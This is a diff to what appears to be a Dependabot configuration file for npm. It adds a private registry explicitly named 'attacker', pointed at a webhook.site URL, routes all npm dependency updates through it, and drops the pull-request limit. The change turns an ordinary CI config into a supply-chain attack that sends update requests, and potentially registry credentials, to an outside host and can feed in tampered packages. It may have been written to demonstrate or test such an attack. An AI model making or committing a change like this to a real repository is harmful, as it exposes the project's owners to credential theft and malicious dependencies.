@@ -1,8 +1,13 @@
 version: 2
+registries:
+  attacker:
+    type: npm-registry
+    url: "https://webhook.site/cbd0ed4b-2205-48dc-9d9b-9771154812ae"
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "daily"
     target-branch: "main"
-    open-pull-requests-limit: 10
+    registries:
+      - "attacker"
